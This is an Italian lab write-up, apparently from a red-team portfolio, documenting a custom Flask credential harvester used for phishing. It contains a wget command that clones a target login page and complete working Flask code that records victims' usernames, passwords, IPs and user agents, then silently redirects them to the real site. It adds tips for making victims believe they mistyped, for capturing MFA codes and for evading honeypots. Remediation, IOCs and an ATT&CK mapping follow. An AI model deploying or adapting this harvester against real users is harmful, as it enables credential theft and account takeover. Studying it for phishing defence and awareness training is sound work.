> [English](README.en.md) | **Italiano**

# Credential Harvester - Flask Custom Login Page

> - **Fase:** Social Engineering - Custom Credential Harvesting
> - **Visibilita:** Media - il server Flask genera log HTTP; la landing page e visibile a scanner di URL reputation; il dominio/IP e tracciabile
> - **Prerequisiti:** Python 3.10+, Flask, conoscenza HTML/CSS per clonazione pagina login; server web raggiungibile dal target (VPS o tunnel)
> - **Output:** SE-014 (credenziali catturate in chiaro con logging IP/User-Agent - severity Alto)

- **Ambiente Operativo:** Kali Linux Purple (Server Flask), Windows 10 VM (Vittima con browser)
- **Target:** Utente simulato che visita la landing page
- **Framework:** Flask 3.x, Python 3.11
- **Tecniche Documentate:** Website Cloning, Credential Capture, Request Logging

---

## Executive Summary

Il credential harvester custom Flask offre il massimo controllo sulla logica di cattura rispetto ai tool integrati (GoPhish credential harvester, SET site cloner). Il vantaggio principale e la personalizzazione: logica di redirect condizionale (mostrare errore "password errata" per ottenere un secondo tentativo), logging strutturato in JSON con metadati completi, integrazione con qualsiasi framework di delivery, e possibilita di aggiungere un secondo form per catturare il codice MFA (OTP phishing).

---

## Credential Harvester: Flask Login Clone

**ID Finding:** `SE-014` | **Severity:** `Alto`

### PoC - Fase 1: Clonazione Pagina Login

```Bash
# Clonazione della pagina target con wget
wget --mirror --convert-links --page-requisites --no-parent \
  https://portal.company-lab.local/login -P ./templates/

# Oppure salvataggio manuale da browser:
# Ctrl+S -> "Pagina web, completa" -> salvare in templates/
```

### PoC - Fase 2: Server Flask

```python
# app.py
from flask import Flask, request, render_template, redirect
import json, datetime, os

app = Flask(__name__)
LOG_DIR = 'logs'
os.makedirs(LOG_DIR, exist_ok=True)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def capture():
    entry = {
        'timestamp': datetime.datetime.now().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer', 'direct'),
        'username': request.form.get('username', ''),
        'password': request.form.get('password', '')
    }
    with open(f'{LOG_DIR}/creds.json', 'a') as f:
        f.write(json.dumps(entry) + '\n')
    print(f"\n[!] CREDENTIALS CAPTURED")
    print(f"    User: {entry['username']}")
    print(f"    Pass: {entry['password']}")
    print(f"    IP:   {entry['ip']}")
    # Redirect al sito reale (la vittima non nota nulla)
    return redirect('https://portal.company-lab.local/login?session_expired=1')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=False)
```

### PoC - Fase 3: Esecuzione e Cattura

```Bash
sudo python3 app.py
```

```
 * Running on http://0.0.0.0:80
 * Press CTRL+C to quit
```

```
# La vittima visita http://192.168.0.110/ e inserisce le credenziali:

[!] CREDENTIALS CAPTURED                                    <-- SE-014
    User: m.rossi@company-lab.local
    Pass: M4ri0R0ss1!
    IP:   192.168.0.120

# File logs/creds.json:
{"timestamp": "2026-03-15T10:16:42", "ip": "192.168.0.120", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0", "referer": "direct", "username": "m.rossi@company-lab.local", "password": "M4ri0R0ss1!"}
```

### Remediation

- **Azione immediata:** reset password per l'utente compromesso; analisi log per altri account catturati
- **Azione strutturale:** MFA su tutti gli account; URL filtering con categorizzazione in tempo reale; training awareness per riconoscimento URL sospetti
- **Verifica:** tentativo di accesso con credenziali catturate - deve fallire dopo il reset + MFA

---

## Esperienza di Laboratorio

La clonazione della pagina login e stata la fase piu delicata. Il primo tentativo con `wget --mirror` ha prodotto una pagina funzionale ma con riferimenti a risorse esterne (CSS, JS da CDN) che generavano mixed content warnings in HTTPS. La soluzione e stata scaricare tutte le risorse localmente e aggiornare i path nel template HTML.

Il punto piu critico del design e stato il redirect post-cattura. Un redirect alla homepage (`/`) mostra la stessa pagina di login, insospettendo la vittima. Il redirect al sito reale con parametro `?session_expired=1` e piu credibile: la vittima vede la pagina di login reale e assume di aver inserito la password errata.

---

## Analisi Teorica: Custom vs Framework

Il vantaggio del tool custom su GoPhish non e la potenza (GoPhish ha metriche superiori), ma la flessibilita. Scenari che richiedono un harvester custom:
- **MFA phishing (senza Evilginx):** un secondo form che cattura il codice OTP dopo username+password
- **Conditional redirect:** redirect diverso basato sull'email inserita (per targeting selettivo)
- **Honeypot detection:** se il campo username contiene un indirizzo noto come honeypot, non loggare e redirigere immediatamente

---

## Scenario Reale: Proiezione Post-Exploitation

> Questa sezione descrive come questo finding si inserirebbe in un engagement reale.

### Prospettiva Attaccante (Red Team)

**Kill Chain proiettata:**

```
[SE-014] Credenziali catturate via Flask harvester
        |
        v
Credential validation -> test su VPN/OWA/RDP
        |
        v
Account takeover -> accesso servizi aziendali
        |
        v
BEC / Lateral Movement -> compromissione estesa
```

### Prospettiva Difensore (Blue Team)

**IOC:** login da IP anomalo; URL non categorizzato visitato da piu utenti; report utente di "password errata" dopo click su link email.

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | Sviluppo credential harvester Flask custom |
| Resource Development | Stage Capabilities: Upload Malware | `T1608.001` | Deploy del server su infrastruttura attaccante |
| Initial Access | Phishing: Spearphishing Link | `T1566.002` | Link alla landing page Flask inviato via email |
| Credential Access | Input Capture: Web Portal Capture | `T1056.003` | Cattura username e password dalla pagina clone (SE-014) |

---

> **Nota:** Il tool e stato testato esclusivamente in ambiente lab. Nessuna credenziale reale e stata catturata.
